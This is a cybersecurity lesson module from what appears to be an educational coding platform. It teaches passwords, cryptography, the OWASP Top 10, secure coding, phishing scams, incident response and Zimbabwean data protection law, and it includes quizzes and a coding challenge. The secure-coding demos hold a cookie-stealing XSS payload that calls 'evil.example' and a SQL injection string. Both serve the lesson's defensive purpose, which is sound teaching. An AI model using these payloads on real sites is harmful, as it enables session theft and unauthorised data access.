---
id: security
title: Cybersecurity Essentials
short: SECURITY
category: cloud
level: intermediate
language: python
color: "#B4472A"
icon: "🔐"
order: 63
summary: Protect people, systems and data. Threats and attackers, passwords and MFA, cryptography basics, the OWASP Top 10, secure coding, phishing and mobile-money scams, incident response and data protection law.
tags: [security, cybersecurity, owasp, encryption, phishing, secure coding]
---

# Why Security Matters {#intro}

Every system you build will be attacked — usually not by a genius, but by automated tools and scammers looking for easy targets: weak passwords, unpatched software, leaked API keys, careless code.

## The CIA triad


```sketch
title: "Confidentiality, integrity, availability"
caption: "Every security control protects at least one of these. Name which one is at risk and the right defence becomes clearer."
cellW: 230
cellH: 95
nodes:
  - id: c
    label: "Confidentiality"
    col: 0
    row: 0
    shape: round
    tone: sky
    sub: "only the right people see it"
  - id: i
    label: "Integrity"
    col: 1.5
    row: 0
    shape: round
    tone: gold
    sub: "nobody changes it secretly"
  - id: a
    label: "Availability"
    col: 3
    row: 0
    shape: round
    tone: teal
    sub: "it works when needed"
  - id: ex1
    label: "encryption · access control"
    col: 0
    row: 1.2
    shape: note
  - id: ex2
    label: "hashes · signatures · logs"
    col: 1.5
    row: 1.2
    shape: note
  - id: ex3
    label: "backups · rate limits"
    col: 3
    row: 1.2
    shape: note
edges:
  - from: c
    to: ex1
    dashed: true
  - from: i
    to: ex2
    dashed: true
  - from: a
    to: ex3
    dashed: true
```

| Goal | Meaning | Example failure |
|---|---|---|
| **Confidentiality** | Only the right people see data | Learner records leaked online |
| **Integrity** | Data isn't changed improperly | Exam marks altered |
| **Availability** | Systems work when needed | Website down during registration |

## Common attackers and motives

- **Scammers** — money (phishing, SIM-swap, fake payment confirmations).
- **Criminal groups** — ransomware, data theft for sale.
- **Insiders** — staff misusing access, accidentally or deliberately.
- **Opportunists** — scanning the internet for weak systems.

# Passwords and MFA {#passwords}


```sketch
title: "How a site should check your password"
caption: "The server never stores your password. It stores a slow, salted hash and compares hashes at login. A second factor stops stolen passwords working."
cellW: 190
nodes:
  - id: pw
    label: "Password typed"
    col: 0
    row: 0
    shape: note
    tone: sky
  - id: h
    label: "Slow hash + salt"
    col: 1.5
    row: 0
    shape: round
    tone: gold
    sub: "argon2 · bcrypt"
  - id: cmp
    label: "Same as stored?"
    col: 3
    row: 0
    shape: diamond
    tone: grape
  - id: mfa
    label: "Second factor"
    col: 3
    row: 1.3
    shape: round
    tone: teal
    sub: "app code · passkey"
  - id: in
    label: "Signed in"
    col: 1.5
    row: 1.3
    shape: pill
    tone: teal
edges:
  - from: pw
    to: h
  - from: h
    to: cmp
  - from: cmp
    to: mfa
    label: "yes"
  - from: mfa
    to: in
```

- Use **long passphrases** (4+ random words) — length beats complexity.
- Use a **password manager** (Bitwarden, 1Password, KeePassXC) — a unique password everywhere.
- Turn on **multi-factor authentication (MFA)** everywhere, preferably an authenticator app or security key. SMS codes are better than nothing but vulnerable to SIM-swap.

```python run title="How fast can a password be guessed?"
import math

def entropy_bits(length, alphabet_size):
    return length * math.log2(alphabet_size)

def crack_time(bits, guesses_per_second=1e10):
    seconds = 2 ** bits / 2 / guesses_per_second
    for unit, size in [("years", 31_536_000), ("days", 86_400), ("hours", 3_600), ("seconds", 1)]:
        if seconds >= size:
            return f"{seconds / size:,.1f} {unit}"
    return "instantly"

examples = {
    "8 lowercase letters": entropy_bits(8, 26),
    "8 mixed chars (upper, lower, digits, symbols)": entropy_bits(8, 94),
    "4 random common words (from 7,776)": 4 * math.log2(7776),
    "6 random common words": 6 * math.log2(7776),
}
for name, bits in examples.items():
    print(f"{name:48} {bits:5.1f} bits → {crack_time(bits)}")
```

> These estimates assume an offline attack on a fast hash. That's why sites must store passwords with **slow** hashes like bcrypt, Argon2 or PBKDF2.

# Cryptography Basics {#crypto}


```sketch
title: "Three tools, three jobs"
caption: "Hashing proves data is unchanged, symmetric encryption hides data with one shared key, and public-key cryptography lets strangers set up that key safely."
cellW: 200
cellH: 100
nodes:
  - id: h
    label: "Hashing"
    col: 0
    row: 0
    shape: round
    tone: gold
    sub: "one way · SHA-256"
  - id: s
    label: "Symmetric"
    col: 1.5
    row: 0
    shape: round
    tone: sky
    sub: "one key · AES"
  - id: p
    label: "Public key"
    col: 3
    row: 0
    shape: round
    tone: grape
    sub: "key pair · TLS, signing"
  - id: hu
    label: "Is the file intact?"
    col: 0
    row: 1.2
    shape: note
  - id: su
    label: "Encrypt the disk"
    col: 1.5
    row: 1.2
    shape: note
  - id: pu
    label: "HTTPS handshake"
    col: 3
    row: 1.2
    shape: note
edges:
  - from: h
    to: hu
    dashed: true
  - from: s
    to: su
    dashed: true
  - from: p
    to: pu
    dashed: true
```

| Tool | What it does | Use for |
|---|---|---|
| **Hashing** (SHA-256) | One-way fingerprint | File integrity, (with salt + slowness) passwords |
| **Symmetric encryption** (AES) | Same key locks and unlocks | Encrypting files and disks |
| **Asymmetric encryption** (RSA, ECC) | Public key locks, private key unlocks | TLS, SSH, signatures |
| **Digital signatures** | Prove who sent something and that it wasn't changed | Software updates, payment webhooks |
| **HMAC** | Keyed hash proving integrity + authenticity | API and webhook signatures |

```python run title="Hashes change completely with tiny changes"
import hashlib, hmac

for msg in ["Pay Rudo $10", "Pay Rudo $100"]:
    print(f"{msg:14} → {hashlib.sha256(msg.encode()).hexdigest()[:32]}…")

key = b"server-secret"
sig = hmac.new(key, b"Pay Rudo $10", hashlib.sha256).hexdigest()
print("\nSignature valid:", hmac.compare_digest(sig, hmac.new(key, b"Pay Rudo $10", hashlib.sha256).hexdigest()))
print("Tampered valid: ", hmac.compare_digest(sig, hmac.new(key, b"Pay Rudo $100", hashlib.sha256).hexdigest()))
```

> **Never invent your own cryptography.** Use well-tested libraries and standard algorithms.

# The OWASP Top 10 {#owasp}

The **OWASP Top 10** lists the most critical web application risks. Every web developer should know them:

| Risk | What goes wrong | Defence |
|---|---|---|
| **Broken access control** | Users reach data or actions they shouldn't (`/api/orders/1043` shows someone else's order) | Check authorisation on the server for every request |
| **Cryptographic failures** | Plain-text passwords, no HTTPS | Strong hashing, TLS everywhere |
| **Injection** (SQL, command) | Input becomes code | Parameterised queries, never `eval` input |
| **Insecure design** | No limits, no threat model | Design with abuse cases in mind |
| **Security misconfiguration** | Default passwords, debug mode on, open storage buckets | Hardened defaults, reviews |
| **Vulnerable components** | Old libraries with known bugs | Update dependencies; `npm audit`, `pip-audit` |
| **Authentication failures** | No rate limiting, weak sessions | MFA, lockouts, secure cookies |
| **Integrity failures** | Unsigned updates, unsafe deserialisation | Verify signatures |
| **Logging & monitoring failures** | Attacks go unnoticed | Log security events and alert |
| **SSRF** | Server fetches attacker-chosen URLs | Allow-list destinations |

```python run title="SQL injection — and the fix"
import sqlite3

db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE users (name TEXT, balance REAL)")
db.executemany("INSERT INTO users VALUES (?, ?)", [("Rudo", 120.0), ("Sipho", 45.5)])

attack = "nobody' OR '1'='1"

unsafe = f"SELECT * FROM users WHERE name = '{attack}'"
print("UNSAFE returns:", db.execute(unsafe).fetchall())

safe = db.execute("SELECT * FROM users WHERE name = ?", (attack,)).fetchall()
print("SAFE returns:  ", safe)
```

# Secure Coding Habits {#secure-coding}

1. **Validate input** — type, length, format, range — at every boundary.
2. **Encode output** — escape HTML (`textContent`, template auto-escaping) to stop XSS.
3. **Least privilege** — every user, service and API key gets only what it needs.
4. **Secrets out of code** — environment variables/secret managers; scan repos for leaked keys.
5. **Safe defaults** — deny by default, then allow.
6. **Fail safely** — errors shouldn't reveal stack traces or bypass checks.
7. **Keep dependencies updated**.
8. **Log security events** (logins, permission changes) without logging secrets.
9. **Review code** — a second pair of eyes catches what you miss.

```python run title="Escaping output stops XSS"
import html

comment = '<script>fetch("https://evil.example/steal?c=" + document.cookie)</script>'
print("Raw (dangerous):", comment)
print("Escaped (safe): ", html.escape(comment))
```

# Phishing and Social Engineering {#phishing}

Most breaches start with a person being tricked, not a technical hack.

```sketch
title: "Stop, check, then act"
caption: "Phishing works by creating urgency. Pause, check the sender and link through a channel you already trust, and report it if it is fake."
cellW: 180
cellH: 100
nodes:
  - id: msg
    label: "Urgent message"
    col: 0
    row: 0.6
    shape: doc
    tone: rose
    sub: "\"account blocked!\""
  - id: stop
    label: "Pause"
    col: 1.4
    row: 0.6
    shape: pill
    tone: gold
  - id: chk
    label: "Verify another way?"
    col: 2.8
    row: 0.6
    shape: diamond
    tone: sky
    sub: "call the real number"
  - id: ok
    label: "Act on it"
    col: 4.2
    row: 0
    shape: pill
    tone: teal
  - id: rep
    label: "Report & delete"
    col: 4.2
    row: 1.2
    shape: pill
    tone: rose
edges:
  - from: msg
    to: stop
  - from: stop
    to: chk
  - from: chk
    to: ok
    label: "real"
  - from: chk
    to: rep
    label: "fake"
```


## Common local scams

- **Fake payment confirmations** — an SMS that looks like a mobile-money receipt, then "please send back the extra I paid by mistake".
- **"Your account is blocked"** messages asking for your PIN or ID number.
- **SIM-swap** — criminals take over your number to receive your OTPs.
- **Fake job offers and scholarships** asking for an "admin fee".
- **Impersonation** of bosses or relatives on WhatsApp asking for urgent transfers.

## Red flags

- Urgency or fear ("within 30 minutes or your account closes").
- Requests for **PINs, passwords, OTPs** — legitimate services never ask.
- Links with odd spellings (`ec0cash-verify.xyz`).
- Too good to be true.

**Always verify through a separate channel** — check your actual balance in the app, call the person on a number you already know.

```quiz
- q: Someone sends an SMS "receipt" saying they overpaid you and asks you to send money back. What should you do first?
  options: ["Send it back immediately", "Check your actual balance in your official app", "Reply with your PIN", "Forward it to friends"]
  answer: 1
```

# Incident Response {#incident-response}

When something goes wrong, a plan saves hours and money:

1. **Prepare** — know who to call, have backups and logs.
2. **Detect** — alerts, unusual activity, user reports.
3. **Contain** — disconnect affected machines, revoke leaked keys, reset passwords.
4. **Eradicate** — remove the cause (malware, vulnerable code).
5. **Recover** — restore from clean backups, monitor closely.
6. **Learn** — blameless review; fix the gaps.

> If an API key leaks (for example, committed to GitHub), **revoke it immediately** and create a new one. Deleting the commit isn't enough — bots scan GitHub within minutes.

# Data Protection Law {#law}

Zimbabwe's **Cyber and Data Protection Act [Chapter 12:07]** (2021) sets rules for processing personal information, overseen by the Postal and Telecommunications Regulatory Authority of Zimbabwe (POTRAZ) as the data protection authority. Key principles, shared with laws like the EU's GDPR:

- **Lawful, fair and transparent** processing — people know what you collect and why.
- **Purpose limitation** — use data only for the stated purpose.
- **Data minimisation** — collect only what you need.
- **Accuracy** — keep it correct and up to date.
- **Storage limitation** — don't keep it forever.
- **Security** — protect it appropriately.
- **Rights** of data subjects — access, correction and objection.
- **Breach notification** — report serious breaches.

Build these into your systems from the start ("privacy by design"). For real projects, get qualified legal advice.

## Careers in security

SOC analyst, penetration tester, security engineer, cloud security engineer, GRC (governance, risk and compliance) analyst. Practise legally on platforms like **TryHackMe**, **Hack The Box** and **OWASP Juice Shop** — never test systems you don't own or have permission to test.

> **Next: securing AI agents.** Agents that read untrusted content and take real actions add new attack paths: prompt injection, tool misuse, poisoned memory and malicious MCP servers. **[Agentic AI Security](/learn/agentic-security)** covers how to defend them, and how security teams can use agents safely.

````challenge
id: sec-password-check
title: Password policy checker
difficulty: medium
prompt: |
  Write `check_password(pw, common)` that returns a **list of problems** (empty if the password is acceptable):
  - `"too short"` if fewer than **12** characters,
  - `"too common"` if `pw.lower()` is in the set `common`,
  - `"repeated characters"` if any character appears **4 or more times in a row**.

  Check in that order.
starter: |
  def check_password(pw, common):
      problems = []
      return problems

  common = {"password123456", "qwertyuiop123"}
  print(check_password("mangoes-kombi-river-7", common))
tests: |
  common = {"password123456", "qwertyuiop123"}
  assert check_password("mangoes-kombi-river-7", common) == []
  assert check_password("short", common) == ["too short"]
  assert check_password("Password123456", common) == ["too common"]
  assert check_password("aaaa", common) == ["too short", "repeated characters"]
  assert check_password("goodpassphrase!!!!x", common) == ["repeated characters"]
````

```quiz
- q: Which OWASP risk is "a learner can view another learner's results by changing the ID in the URL"?
  options: ["Injection", "Broken access control", "Cryptographic failure", "SSRF"]
  answer: 1
- q: What stops SQL injection?
  options: ["Longer passwords", "Parameterised queries", "HTTPS", "Bigger servers"]
  answer: 1
- q: An API key was pushed to a public GitHub repo. What do you do first?
  options: ["Delete the commit only", "Revoke the key immediately and issue a new one", "Make the repo private and forget it", "Nothing"]
  answer: 1
```

```exam
- q: "What does the 'I' in the CIA triad stand for?"
  options: ["Integrity", "Internet", "Identity", "Information"]
  answer: 0
- q: "Which is the strongest second factor?"
  options: ["An authenticator app or security key", "SMS only", "A security question", "Your birthday"]
  answer: 0
- q: "What does HMAC prove?"
  options: ["A message came from someone with the key and wasn't changed", "A message is secret", "A user is an admin", "A file is small"]
  answer: 0
- q: "Which practice prevents XSS?"
  options: ["Escaping output", "Longer passwords", "Bigger servers", "Disabling HTTPS"]
  answer: 0
- q: "What should you never share, even with the 'bank'?"
  options: ["Your PIN or OTP", "Your public name", "The bank's website", "Your town"]
  answer: 0
- q: "What is the first step of incident response when an attack is detected?"
  options: ["Contain it", "Celebrate", "Ignore it", "Delete all logs"]
  answer: 0
```
